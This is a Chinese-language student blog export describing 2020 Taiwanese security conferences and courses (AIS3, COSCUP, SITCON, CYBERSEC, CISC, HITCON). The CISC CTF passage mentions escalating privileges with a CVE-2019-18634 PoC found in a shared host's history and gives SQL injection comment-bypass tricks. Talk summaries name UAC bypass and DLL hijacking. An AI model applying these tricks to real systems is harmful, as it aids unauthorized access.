+<h3 id="AIS3-新型態資安食物實務課程-7-27-8-2-NTUST"><a href="#AIS3-新型態資安食物實務課程-7-27-8-2-NTUST" class="headerlink" title="AIS3 新型態資安食物實務課程 (7/27 - 8/2) @NTUST"></a>AIS3 新型態資安<del>食物</del>實務課程 (7/27 - 8/2) @NTUST</h3><p>通過 <a href="../200630-ais3-pre-exam-writeups/">AIS3 Pre-exam</a> 前180名者才能參加的資安課程，印象中最後錄取186名(?) 換句話說就算非資安背景的同學也有一定的實力，課程共七天形式採五天上課、兩天專題報告，而今年的分組類別有 <strong>關鍵基礎設施</strong>、<strong>國家安全</strong>、<strong>數位鑑識</strong>、<strong>網頁安全</strong>、<strong>軟體安全開發</strong>，所以分組的題目會和最後專題議題有關，而且要在上課的五天課餘時間生出來，也因為事前打聽到會弄到半夜，所以我台北人還特地申請台科大宿舍(FREE) = w =</p>
+<p>然後… 可以從官方的安排感受到 <code>關鍵基礎設施</code> &amp; <code>國家安全</code> 投注特別多的心力 XD</p>
+<p>當時在pre-exam的聊天室聽到<strong>關鍵基礎設施</strong>課程會教內網滲透覺得很有趣，所以我填志願放在第一順位，結果課程主要是以工控系統(ICS)為主的資安議題，<a href="https://ithelp.ithome.com.tw/articles/10186904">伊朗核電廠病毒 Stuxnet</a> 和 <a href="https://www.ithome.com.tw/news/125098">2018 台積電產線中毒事件</a> 常常被拿出來鞭(X) 警惕(O)，焦點多圍繞在<code>Modbus 工業領域通訊協定</code>、<code>OPC UA 自動化技術的傳輸協定</code>、<code>SCADA系統</code>，導致要想專題題目時挺頭疼的，畢竟真要做起來規模都不小（或是用模擬的方式），這裡也感謝組員用力 CARRY，臨時生出針對 Operator 和 PLC 之間的明文傳送用 <code>訊息識別碼(MAC)</code> 上簽章防 <code>中間人攻擊(MITM)</code>，也讓我幾乎在旁邊當廢人 QwQ</p>
+<p>其他比較有趣的課像是<strong>數位鑑識</strong>由<strong>陳仲寬</strong>主講的「Chimera APT攻擊調查：案例及調查手法分享」，印象中為了讓我們聽懂前面補很多Domain knowledge，結果最後重點反而講得很匆忙稍嫌可惜，不過內容有趣到<strong>stavhaygn</strong>一度想跳槽到數位鑑識組XD Lab方面教<code>moloch</code>分析<code>.pcap</code>封包，看來以後除了Wireshark又多了一套工具…如果我還記得怎麼用的話。 再來<strong>軟體開發安全</strong>由<strong>Ysc</strong>主講的「開發安全與資安測試」，重點放在<strong>自動化</strong>、<strong>自動化</strong> 還有<strong>自動化</strong>（正色），真的是講師開頭結尾都在強調的東西XDDD 這門重點放在DevOps的<code>CI/CD</code>（即自動化整合及部署），並加入資安各種自動化檢查測試，形成<strong>DevSecOps</strong>讓整個流程能夠更完善，這也讓我發現身邊有很多常用工具有這方面的應用，包括GitHub、GitLab、Docker、Jenkins、Docker，真的算是開了眼界，<del>也可能是我自己太少接觸哭哭</del>。 另外<strong>鄭欣明</strong>帶來的實作4G偽基地站提取手機<code>IMSI</code>也蠻有趣，只是我們自己用手機找不到<code>IMSI</code>沒辦法驗證（只能挖到<code>IMEI</code>）有點好笑，最後做完我還幫官方電腦裝ASCII水族箱 嘻嘻 ヽ(✿ﾟ▽ﾟ)ノ </p>
+<p><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1618836340/blog-posts/2020-08/19-ais3-1.webp" alt=" "></p>
+<p>所以我說那個內網滲透呢？嗯、他被放在<strong>網頁安全</strong>由<strong>楊鈞皓</strong>主講的「紅人演練」，是個很精實的AD域滲透實作，包含一些提權及橫向滲透，跟我之前的<strong>網路安全</strong>專題有87%像，只是滲透等級又更高了許多，甚至到有點跟不上的程度 XD  最後<strong>國家安全</strong>唔嗯… 只能說很尷尬，大方向都是都是對網路言論或是資訊進行分析，感覺和這方面有關的台下都… Zzzz 都在念舊上午的紅人演練，看來大家都比較喜歡偏實務演練的課 = w =</p>
+<p><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1618836340/blog-posts/2020-08/19-ais3-2.webp" alt=" "></p>
+<p>結果在無聊之餘在報復性聊天室還出現很多CSS攻擊XDDDD<br>最後群組就出現這張圖…. 笑死 <del>CSY明明沒參加還是會被信徒拿出來喊</del></p>
+<p><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1618836340/blog-posts/2020-08/19-ais3-meme.webp" alt=" "></p>
+<p>噢對 Day 1 &amp; 2 晚上都由額外的活動，所以晚餐是由<strong>奧義智慧</strong>贊助…嗯？你問我他們不是賣冰淇淋的嗎 XD 不僅如此，他們還有出過桌遊呢 🤣</p>
+<div class="group-picture"><div class="group-picture-container"><div class="group-picture-row"><div class="group-picture-column" style="width: 50%;"><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1618836340/blog-posts/2020-08/19-ais3-3.webp" alt=" "></div><div class="group-picture-column" style="width: 50%;"><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1618836340/blog-posts/2020-08/19-ais3-4.webp" alt=" "></div></div></div></div>
+
+<p>課程共筆的部分可以參考 <a href="https://hackmd.io/@AIS3-2020/AIS3/">https://hackmd.io/@AIS3-2020/AIS3/</a> ，也可以去朝聖一下報復性聊天室，只是現在回去看已經沒那麼精采，當時真的是有些高頻率閃動是看了眼睛會痛 wwwww</p>
+<p>大概就是這樣，最後兩天的專題感覺很微妙。還沒報告的組別忙著報告，報告完的多半也無心繼續聽(?)<br>聽說是從去年改成專題形式，應該大家都比較想玩Final CTF。<br>不過值得一提是<strong>網路安全</strong>組的釣魚實驗，我… 我真的有被騙到wwwww<br>雖然我是第一個在官方群組反應的，對話還因此被節錄放在他們的報告上（抹臉</p>
+<p><img src="https://scontent-tpe1-1.xx.fbcdn.net/v/t1.6435-9/116876073_1422552744607334_7967008070103188353_n.jpg?_nc_cat=108&ccb=1-3&_nc_sid=0debeb&_nc_ohc=JMPDHw1MlZYAX8cxWw8&_nc_ht=scontent-tpe1-1.xx&oh=698abed715f6af88ef66a0ce24851092&oe=60A32FB4" alt=" "></p>
+<p>簡言之就是</p>
+<table>
+<thead>
+<tr>
+<th align="center"></th>
+<th align="center">官方網站</th>
+<th align="center">釣魚網站</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">Website</td>
+<td align="center">ais3.org</td>
+<td align="center">ais3.tw</td>
+</tr>
+<tr>
+<td align="center">IG</td>
+<td align="center">ais3tw</td>
+<td align="center">ais3org</td>
+</tr>
+</tbody></table>
+<p>他們巧妙的把官方的命名不統一對調，結果就不小心上鉤了 嗚嗚<br>看來我身為資安人的資安意識還差得遠呢 ……<br><del>但也因此有機會認識到游桑和Tina兩位大大 www</del></p>
+<h3 id="COSCUP-開源人年會-8-1-8-2-NTUST"><a href="#COSCUP-開源人年會-8-1-8-2-NTUST" class="headerlink" title="COSCUP 開源人年會 (8/1 - 8/2) @NTUST"></a>COSCUP 開源人年會 (8/1 - 8/2) @NTUST</h3><p>有沒有覺得COSCUP的時間有點眼熟 … 嗯沒錯，剛好就是AIS3的最後兩天專題報告<br>而且還同樣都在台科大（大概走路 5 分鐘可到） XD<br>所以當我<strong>關鍵基礎設施</strong>在專題報告 Day 1 上午報完，就開始規劃想聽的議程（下午是<strong>國家安全</strong>專題），然後偷溜出去（抹臉</p>
+<p><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1618836340/blog-posts/2020-08/19-coscup-1.webp" alt=" "></p>
+<p>攤位的部分，因為<strong>stavhaygn</strong>在前幾天在<strong>MOPCON</strong>的粉絲頁tag我開玩笑地想拿貼紙，結果我翹課過去馬上就被官方認出來，還破例讓我多拿幾張，笑死www 到現在還是不太敢貼在筆電上&gt;///&lt;<br><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1618836340/blog-posts/2020-08/19-coscup-2.webp" alt=" "></p>
+<p>除了到處晃晃拿貼紙，我還在官方攤買了酒杯和線材包，被同行友人笑每次翹課都會有收穫（幹w<br><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1618836340/blog-posts/2020-08/19-coscup-3.webp" alt=" "></p>
+<p>議程部分都大概平均都半小時，Day 1主要都在逛攤、Day 2 由於很想聽<strong>網路安全</strong>的釣魚專題 還有<strong>stavhaygn</strong>的專題，所以偷溜出去的頻率少了一些，印象中聽的議程有<code>GCP</code>、<code>SDN x Cloud</code>、<code>Golang</code>、<code>Vault 私鑰管理</code>，還有個<code>Open Source 推廣分享</code>是去朝聖常常在FB和小馬拌嘴的蝦蝦姊（笑） 。我在開源界的時間不算長，平常也只是偶爾摳來用，所以跑的主題幾乎都是聽過但沒機會摸，算是去增廣見聞，另外、還有認親 XDDDD<br><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1618836340/blog-posts/2020-08/19-coscup-4.webp" alt=" "></p>
+<p>噢對了，另外我還拿到了神奇序號，主要是右邊的<code>.tw</code>免費註冊域名，只是想Domain name是個令人頭疼的事QQ 另外左邊的<code>.GAY</code>工商真的頗炫wwww<br><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1618836340/blog-posts/2020-08/19-coscup-5.webp" alt=" "></p>
+]]></content>
+      <categories>
+        <category>心得分享</category>
+      </categories>
+      <tags>
+        <tag>AIS3</tag>
+        <tag>COSCUP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Summer Conf. に行きましょう！ PART 2</title>
+    <url>/2020/fc546b52265a/</url>
+    <content><![CDATA[<blockquote>
+<p>TODO</p>
+</blockquote>
+<p>SITCON 2020 &amp; CYBERSEC 2020</p>
+<a id="more"></a>
+
+<h3 id="SITCON-學生計算機年會-8-8-中研院人文社科館"><a href="#SITCON-學生計算機年會-8-8-中研院人文社科館" class="headerlink" title="SITCON 學生計算機年會 (8/8) @中研院人文社科館"></a>SITCON 學生計算機年會 (8/8) @中研院人文社科館</h3><p><strong>AIS3</strong> 結束隔天馬上就回高雄開會，隔了一週再度回到台北，有夠忙#<br><strong>SITCON</strong> 是我在大學期間蠻常聽到的Conf. ，無奈我大二轉學跑到NUK後比較沒有契機北上參加，今年由於疫情延到暑假（歷年都辦在三月），配合下一個<strong>CYBERSEC</strong>活動，當然是參加啦！ 也感謝社群朋友的讓票，原本沒搶到票想說到時候再用小額贊助$1000的方式拿票，還順便幫<strong>翔君</strong>撿了一張（笑）</p>
+<p><a href="https://www.flickr.com/photos/sitcon/50258126176/in/album-72157715603590802/?fbclid=IwAR05p6AZvcP_lJV2bbibBLXEqtbycMxuH4p5cOg6wJ3qTCMQz9nWEKsdqe4"><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1618836340/blog-posts/2020-08/19-sitcon-1.webp"></a></p>
+<p>然後，8/8 當天我睡過頭了XDDDD<br>因為前一天深夜才到台北，家人早上又是6點出門，所以我5:30起床和他們討論晚上的父親節行程，然後睡回籠覺Zzzz 後來發現遲到直接搭小黃花了$350有夠散財，還錯過開幕式 可惡qq 不過事後補看開場動畫真的用心，感覺很適合拿來搭音Game的PV XD<br>不得不說很佩服這種全部由學生自發起扛起的Conf. ，場面上也看到很多在資訊圈的熟面孔。</p>
+<p>活動主要分兩個部分，分別是大地遊戲 &amp; 議程。<br>先說說大地遊戲好了，簡單講就是透過他們的app和攤位互動，達成賓果連線可以換指定小物。但是由於議程之間的休息時間很短，所以我有放掉幾場花時間和攤位交流，像是<strong>AMD</strong>飲料店 (??) 還有<strong>奧義</strong>冰淇淋公司 (???) XDDDDD  </p>
+<div class="group-picture"><div class="group-picture-container"><div class="group-picture-row"><div class="group-picture-column" style="width: 50%;"><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1618836340/blog-posts/2020-08/19-sitcon-2.webp" alt=" "></div><div class="group-picture-column" style="width: 50%;"><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1618836340/blog-posts/2020-08/19-sitcon-3.webp.jpg" alt=" "></div></div></div></div>
+
+<p>題外話 <a href="https://www.flickr.com/photos/sitcon/50258130671/in/album-72157715603590802/?fbclid=IwAR2JXBNnVeNYmWfefPT5jJJZcBnw_jA8byXbESAwLPStVCKRDklF5sxTbUw">奧義冰淇淋</a> 這張構圖我很喜歡，官方攝影組好強w</p>
+<p>不過下午全部連線才發現獎品都發完了，嗚嗚花太多時間聽議程了(雖然也不是壞事)，所以只有拿<strong>愛情彩</strong>的彩券(但最後也沒中獎)，另外由於大家都連會場的Wi-Fi，結果有些攤位需要Facebook按讚分享的活動很容易被ban掉，我猜是Session不夠用爆掉了嘖嘖。</p>
+<p>再來說說議程，既然是以學生為本的，原本以為應該不會太難懂… 不 我錯了，雖然沒有到完全聽不懂的慘，但也足夠讓我感受到同樣身為學生但技術上的距離感。 簡單介紹幾個有趣的議題：</p>
+<ul>
+<li>「<a href="https://www.youtu.be/1gFBx16AlMc">第一次做密室逃脫就上手</a>」結合IoT、AI、AR架起來的密室逃脫，整場描述如何用從0開始把每個機關慢慢做起來，其中有一項是很有科技感的儀式台然後用雷射造型掃描進行比對，背後原理是RFID辨識，然後講師說對外行人可以騙說是AI辨識真的快笑死。</li>
+<li>「<a href="https://youtu.be/TkC19ukBBxk">Playing Win32 Like a K!NG ;)</a>」小馬adr1講的是<code>UAC Bypass</code>，讓駭客能夠騙過系統拿到高權限，還有系統程式的<code>DLL Hijacking</code>、<code>Path Normalization</code>，附帶幾個小Demo… 說真的能這麼容易被繞過聽起來也蠻可怕的= w =</li>
+<li>「<a href="https://youtu.be/C94DAdAlUZ8">自己的機房自己蓋！</a>」整理機房的心得，看得出不只是硬體上的採購，系統方面的佈局也需要時間下功夫，另外就是人脈很重要XDDD 有免費的資源可以拿最棒惹嘻嘻。</li>
+<li>「<a href="https://youtu.be/NGqXSCFvZ3M">我只是個學生，架個網站不想花錢</a>」原本是衝著Github Page的其他玩法，不過這場講的是架個縮網址網站並透過各種免費資源搭建，像是拿Google App Script作為資料庫進行轉址，一路聽下來感覺我好像不太會用到XD</li>
+<li>「<a href="https://youtu.be/49N0uO86oX0">就算是新手，有愛就沒把專案做出來，對吧</a>」記得是談學生用業界的分工方式實作專案，包含工程師、設計師、產品經理等等的經驗，不過老實說這場只是被我在R0休息順便聽的（抹臉）</li>
+<li>「<a href="https://youtu.be/aomXTCTlIW4">CDN 網站攻擊 - 這次換駭客當鬼來抓你了</a>」<br>由Mico介紹，備受好評的一場，也是因為這場讓我對<code>CDN</code>有新的認識，原來駭客還能利用CDN繞過WAF，或是間接撈到一些本來應該藏起來的資訊，如果有時間的朋友蠻推薦去看ㄉ，整場聽完發現一堆domain knowledge要補QQ</li>
+</ul>
+<p>噢對了，還有Lighting Talk，老實說聽了三年MOPCON的經驗，五分鐘好像不太容易被拔線XD 大家都很會抓時間，這次有場真的吸引到我… 嗯更正，是吸引到全場目光，在R0廳的大銀幕玩雲端遊戲真的有夠狂XDDDD</p>
+<div class="group-picture"><div class="group-picture-container"><div class="group-picture-row"><div class="group-picture-column" style="width: 50%;"><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1618836340/blog-posts/2020-08/19-sitcon-4.webp" alt=" "></div><div class="group-picture-column" style="width: 50%;"><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1618836340/blog-posts/2020-08/19-sitcon-5.webp" alt=" "></div></div></div></div>
+
+<p>最後還偷偷在塗鴉牆上幫MacacaHub留名ww<br>總之，整體下來玩得很開心，第一次參加也趁機認識些大神，希望有機會自己能練到和他們差不多的水平&gt;&lt;</p>
+<h3 id="CYBERSEC-臺灣資安大會-8-11-8-12-南港展覽館二館"><a href="#CYBERSEC-臺灣資安大會-8-11-8-12-南港展覽館二館" class="headerlink" title="CYBERSEC 臺灣資安大會 (8/11 - 8/12) @南港展覽館二館"></a>CYBERSEC 臺灣資安大會 (8/11 - 8/12) @南港展覽館二館</h3><p>同樣因疫情影響延到暑假為期兩天的 <strong>CYBERSEC</strong>，由於和 <strong>SITCON</strong> 事隔兩天。加上 Lab 有派人出差，所以我就把行程排在一起了~<br>這場相對前面幾次 Conference，定位上比較面<strong>企業向</strong>，因此從報名到問卷調查常常會問到公司營運相關事項，當然這方面我都拿 Lab 或是 MacacaHub 來填（笑）</p>
+<p><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1618836340/blog-posts/2020-08/19-cybersec-1.webp" alt=" "></p>
+<p>整體活動分成 展覽 &amp; 議程 &amp; CyberLAB。</p>
+<p>先來談談 CyberLAB實戰攻防演練，不同於議程的人數，這個比較偏向單場 20 人的小班制教學（一天四場），Day 1 我經過看到那個報名排隊人潮直接打消念頭XDDD </p>
+<p>展覽方面和資訊博覽會很像，簡單講就是企業擺攤宣傳各種研發成果，其中不乏看得到一些眼熟的企業，像是趨勢科技、Microsoft、奧義智慧、Devcore、中華資安國際 之類ㄉ，而主辦官方加入了大地遊戲的要素，透過和攤位的互動完成對應的條件拿到不同的贈品，先不提光方的贈品很快就被搶完，反倒是每個攤位送的贈品也毫不手軟，看到不少人提的大包小包 …看來大家都是窮到來這裡搶資源 <del>絕對不是什麼議程蟑螂</del> 。</p>
+<p><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1618836340/blog-posts/2020-08/19-cybersec-2.webp" alt=" "></p>
+<p>透過這場活動我也才意識到其實作純資安的公司還不少，雖然探聽了幾間好像大多都是以接case的形式居多，說真的資安這行真的出事才會重視蠻尷尬的QQ 不過從一些議程已經有些單位在推資安框架，整合一些SOP做事前防禦，看起來應該還是有蠻大的發展空間。</p>
+<p>攤位中印象最深的果然還是<strong>奧義智慧</strong>吧，不愧是新創的科技公司，攤位活動展示VR模擬滲透內網、「Cyber IQ數位帝國保衛戰」答題遊戲、資安小學堂問答遊戲、結合MITRE ATT&amp;CK知識的Cyber War卡牌類桌遊，何況他們還吸收了許多CTF圈的人才，能深得我們年輕資訊人的歡迎也是預期之中… 更不用說連衣服的設計上各種致敬新世紀福音戰士 太酷了啦XD</p>
+<p><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1618836340/blog-posts/2020-08/19-cybersec-3.webp" alt=" "></p>
+<p>議程方面，原本想為碩論找些「雲端」議題的議程，可惜都沒聽到什麼有趣的技術分享，反而是圍繞在「人為疏失」如何管理權限這一類偏企業向基本觀念的話題，或是各種工商，有點可惜Orz。另外也照慣例跑去聽了小馬的場，只能說那個場地配置…有點酷？聽說是上一場議程時主投影機出問題，所以直接整個會場座位轉90度用副投影幕，導致講者台在觀眾後面，然後小馬跟觀眾同台XDDDDD</p>
+<p><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1618836340/blog-posts/2020-08/19-cybersec-4.webp" alt=" "></p>
+<p>在 Day 1 結束我還帶著 Lab 同學跑去<strong>天瓏書店</strong>朝聖，資訊方面藏書多到很好混時間的好地方：）<br>整體下來CYBERSEC算是個內容蠻豐富的場次，主要是投入的廠商夠多所呈現的場面夠大，而且也是這個暑假拿最多免費周邊的一次（笑）</p>
+]]></content>
+      <categories>
+        <category>心得分享</category>
+      </categories>
+      <tags>
+        <tag>SITCON</tag>
+        <tag>CYBERSEC</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>碩一生活總結</title>
+    <url>/2020/83de7c48f8c7/</url>
+    <content><![CDATA[<p><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1618836340/blog-posts/2020-08/19-cover.webp" alt=" "></p>
+<blockquote>
+<p>八月的某天大雨後，回家路上隨手一拍。</p>
+</blockquote>
+<p>隨著時間邁入八月，頭銜也要換成二字頭了，時間真的過好快…<br>希望明年這個時候也能這麼愜意地拍照 😭</p>
+<a id="more"></a>
+
+<p>原本有預計暑假要生一些文章出來，結果暑假行程一不小心排滿了XD<br>再加上原本Lab的例行事務 &amp; 學長姐口試支援，弄到現在好不容易才告個段落<br>…只好拿找論文的時間寫文章（抹臉</p>
+<br>
+
+<h2 id="碩一甘苦談？"><a href="#碩一甘苦談？" class="headerlink" title="碩一甘苦談？"></a>碩一甘苦談？</h2><p>不確定各位的碩一時期是怎麼度過，但我現在回憶起來感覺還蠻愜意的（?）<br>在 <a href="../200413-lab-log-0x03/">實驗室日誌 0x03</a> 這篇其實也提的差不多了w</p>
+<p>咱實驗室的碩一生活重點放在修學分 &amp; 審稿 &amp; 看論文，而我自己還會跑 CTF之類的活動。<br>礙於我們老闆實在太忙了，所以開會的頻率越來越低… 在 <a href="../200413-lab-log-0x03/">實驗室日誌 0x03</a> 才說過有恢復常態，結果因為<font color=orange>好的武漢肺炎</font>疫情關係，以及六月開始各種活動停咪到現在Zzzzz 不曉得到底該不該慶幸 😅</p>
+<p>同時也是因為老闆忙，所以到現在我們還沒修過老闆的課，其中授課教授換人的部分有印度籍老師讓爛英文的我很頭疼QQ 所幸在Lab夥伴們的各種 CARRY 下平安度過，感謝各位嗚嗚。</p>
+<p>若要挑一門最有心得的課，那應該就是<strong>網路安全</strong>吧，資管系老師開的資安碩必修。很妙 XD<br>可想而知大部分都是資管學生居多，老師開學就講明密碼學的部分不會講太深，資安碩的可以不用來聽超酷，雖然我們還是乖乖到教室自修(???) 然後期中考全部申論題，印象中咱Lab只有我的分數炸掉 …果然學店生到哪都是學店生。<br>不過後半學期的 hands-on 和 project 主題都能用網路相關自由發揮蠻有趣的，尤其是還有CTF可以打!!<br>然後我們 <strong>MacacaHub</strong> 一個衝勁除了拿下第一，還差兩題破臺。 <font color=navy>\ 展哥教我 /</font><br>每次上臺報告都被我們當社課塞很多奇怪的梗圖 XD 能這樣玩的課真的不多，推推~</p>
+<p>學分的部分一年下來修了 23 學分… 距離畢業門檻差 5 學分算蠻拚的 😤</p>
+<p>審稿部分聽說不是每個Lab都會有(?) 但個人認為算是不錯的修煉，透過審查(X)找碴(O)他人論文來勉勵自己別犯相同的謬誤，只是偶爾時限太短只能匆匆用 Google translate 啃真的有點可惜。另外有時候是審計畫，而且是頁數hen多的那種，那才真的是直接睡Lab… 沒 我開玩笑ㄉ，通常也不會到很難審，只是會多一件事要忙 XD</p>
+<p>剩下時間<del>除了打機之外</del>就是不停找論文看了，說真的到現在也只有個大方向，議題還沒辦法確定。<br>尤其個人看論文的速度真的頗慢<del>（還會分心寫部落格）</del>，而且必須一段段拿去 Google translate 翻完慢慢啃，曾經試過直接咬原文但成效不彰… 真的是有看沒有懂，最後認命回頭翻成中文，有點擔心會不會因為英文太差無法畢業、嘖。</p>
+<br>
+
+<h2 id="暑假南北趴趴走"><a href="#暑假南北趴趴走" class="headerlink" title="暑假南北趴趴走"></a>暑假南北趴趴走</h2><p>這部分本來想開新的一篇介紹，不過金魚腦如我，很多活動內容已經需要用力回想，更不用說技術細節還沒看完嗚嗚<br>所以就拿來當碩一生活總結的一部分放在這裡當遊記分享 wwwww</p>
+<p>總之，拜疫情所賜，延到暑假的活動真的有夠多，讓我幾乎是以週為單為在台北高雄奔波QwQ<br>同時，這些活動真的都是第一次參加，大學時期真的完全沒有契機讓我這樣一直北上跑活動…</p>
+]]></content>
+      <categories>
+        <category>實驗室日誌</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Summer Conf. に行きましょう！ PART 3</title>
+    <url>/2020/b9e09cdc1485/</url>
+    <content><![CDATA[<blockquote>
+<p>TODO</p>
+</blockquote>
+<p>CISC 2020 &amp; HITCON 2020</p>
+<a id="more"></a>
+
+<p>事隔一個月後還有另外兩場資安相關的Conference，雖然時間上不算是<strong>Summer Conf</strong>.，但我也沒打算再開新一篇介紹，所以就繼續在這篇往下更新了 XD</p>
+<h3 id="CISC-全國資訊安全會議-9-1-9-4-NSYSU"><a href="#CISC-全國資訊安全會議-9-1-9-4-NSYSU" class="headerlink" title="CISC 全國資訊安全會議 (9/1 - 9/4) @NSYSU"></a>CISC 全國資訊安全會議 (9/1 - 9/4) @NSYSU</h3><p>原本也是預計辦在五月的會議，偉哉武漢肺炎各種大延期，這場的定位對我來說比較特別，身在主辦方校又是以工人的身份下場幫忙。<br>和規模上和前幾場相比贊助商少了許多，整體會議稍稍陽春一些，今年是第卅屆雖然我不確定之前是否都差不多，但各位工人們都很認真幫忙這倒是真的 :3</p>
+<p>會議時間上長達四天，但實際上議程只有中間 Day 2, Day 3 兩天。<br>Day 1 上午場佈、下午由我們<strong>MacacaHub</strong>以「基礎網頁安全演練」作為CISC開場打頭陣（現在想想我還是不解為何要開 Day 1 的行程 …）<br>Day 4 是活動參訪，分別為爬柴山<del>給猴子看</del>，還有海域純玩水，但由於當時已經有下雨預告的消息，所以取消了0人報名的爬山活動（!）。</p>
+<p>由於 Day 1 的資安演練是額外活動讓會眾自由報名參加，因此原本展哥設定的目標學生是以大學生/碩士生為主，強調<font color=red>基礎</font>網頁安全演練，結果從後台的表單上看到報名會眾都至少都是碩士生，甚至還有幾位是主管等級讓我們大感意外XD 不過最後證實參與的會眾確實都不是這方面專業的，讓我們連原本預期的進度(<code>XSS</code>)都沒時間細講只能匆匆帶過，就這樣<del>抱著展哥的腿</del>平安度過 Day 1。</p>
+<p><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1618836340/blog-posts/2020-08/19-cisc-1.webp" alt=" "></p>
+<blockquote>
+<p><del>發現野生的奧義間諜</del></p>
+</blockquote>
+<p>Day 2 / Day 3 我的主要工作是和Lab學弟搭擋負責 Session A 論文發表的場控/計時/拍照 以及協助主持人和A1場評審，所以很難花心思認真聽報告QQ 何況我被分配到的 Session 比其他場次的組別硬是多了一組，加上台下Q&amp;A實在不受控，想當然爾時間上爆炸不可避ㄏㄏ，工人群組內幾乎只有我回報會晚結束，只能說當個時間管理大師真不容易(X) 老實說要用10分鐘講完一篇研究真的很不夠用，何況包含QA又要把時間壓得更緊，辛苦各位講者了。</p>
+<p>值得一提的還有 Day 2 晚宴在西子灣沙灘會館，雖然從學長的反應看得出應該是已經吃到習以為常了，不過我們倒是喝了不少酒（笑）</p>
+<p>另外，Day 3 上午有資管系主辦的 CISC CTF，所以我們<strong>MacacaHub</strong>就挽起袖子下場一起玩XDDD 整體難度中間偏易，主要有幾題Pwn直接被我忽略XD 其中一題原本要考 <a href="https://www.ithome.com.tw/news/135665">CVE-2019-18634</a>，結果因為所有參賽者共用主機，所以當我Google完CVE後就直接在主機內下<code>history</code>指令看到前一位參賽者 git pull 下來的 PoC，直接被我拿來提權拿Flag XDDDDD<br>還有連續兩題的SQLi，結果同樣<code>--</code>的註解在 SQLi-1 可繞過，但在 SQLi-2 居然沒辦法 = =<br>原本以為是 SQLi-2 的空白繞過沒成功（用<code>/**/</code>），結果賽後討論才發現把註解改成<code>//</code>就拿到flag了…</p>
+<p>原本我一直都穩定位居第四名，最後40多分鐘我集中在分析 Windows 的 event log，雖然用事件分析工具花了不少時間把 Powershell 的 command 還原出來但沒有成功執行QQ 賽後聽到展哥用 strings 就把 command dump 出來也沒成功（但至少不用像我還要慢慢還原XD），等回過神結束時才發現掉到第五名，和前一名差不到 50 分… <strong>唔嗯，我沒有寫Welcome(50)</strong> 笑死XD 反正最後 4,5,6 名都並列<strong>展露頭角獎</strong>也還好就是~</p>
+<blockquote>
+<p>順帶一提前三名: CSY、展哥、Mumu，全部都是南部資安圈熟面孔自己人 ㄏㄏ</p>
+</blockquote>
+<p>Day 4 本來應該是安排爬山和海域玩水，由於 Day 2 取消了爬山的部分，海域的部分礙於不能取消(?)，所以我們很多工人都被抓下海(??)強制玩水，甚至我明明沒填表單卻還是被秘書姊姊從後台報名XDDD 剛好拿CTF撿到的500摳家樂福禮券去買了件泳褲:/</p>
+<p>當天集合時有幾位會眾出現，可能是誤會有爬山活動、又或是以為只有踩踩海灘，總之最後都回家了:))))<br>剩下我們10來位被迫參加的工人各種玩風帆、獨木舟、趴板其實也蠻愉快的，只是菜逼八沒做好防曬整個曬到爆XD</p>
+<h3 id="HITCON-臺灣駭客協會-9-11-9-12-中研院人文社科館"><a href="#HITCON-臺灣駭客協會-9-11-9-12-中研院人文社科館" class="headerlink" title="HITCON 臺灣駭客協會 (9/11 - 9/12) @中研院人文社科館"></a>HITCON 臺灣駭客協會 (9/11 - 9/12) @中研院人文社科館</h3><p>終於輪到最後一場 <strong>Summer Conf</strong>.，同時是首次和 Lab 各位一起北上參加活動，某方面來說有點像畢業旅行(?)</p>
+<p>這次同樣因為疫情影響，在票種上分成線上 &amp; 實體。<br>線上的部分是用開源遊戲引擎 minetest 架設的虛擬會場，一整個 minecraft 風格，可惜我這方面並沒有涉獵太深。實體方面就和之前的 Conf. 形式上同樣是以議程為主，只是這場雖然有廠商但沒有大地遊戲，算是省了到處跑的力氣w</p>
+<p><img src="https://res.cloudinary.com/eevee-blog/image/upload/c_scale,f_auto,q_auto,w_400/v1618836340/blog-posts/2020-08/19-hitcon-1.webp" alt=" 南港高鐵票 "></p>
+<p>第一次做高鐵到南港終點站還蠻新鮮的… 雖然這裡看起來有點荒涼ㄏ<br>飯店的部分我們統一住洛基大飯店<a href="https://goo.gl/maps/xK7EwTqwyWZ6LsAt9">(Google map)</a>個人覺得蠻舒適的，說實在身為台北人實在很難得住台北飯店 XDDD<br><br>Day 0 我們在 check in 後晚餐吃<strong>YAYOI．やよい軒</strong>，雖然價格上有點小貴但我吃得很開心www 尤其我點的餐點還有附說明書(??)<br>交通方面我傻傻地帶著幾位同學坐捷運一站到南港展覽館等免費接駁車，然後比我們晚出發的同學比我們早到才知道原來飯店前就有公車可以直接到工研院，算是我沒算到的失誤 wwww 可惡</p>
+<p><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1618836340/blog-posts/2020-08/19-hitcon-2.webp" alt=" YAYOI "></p>
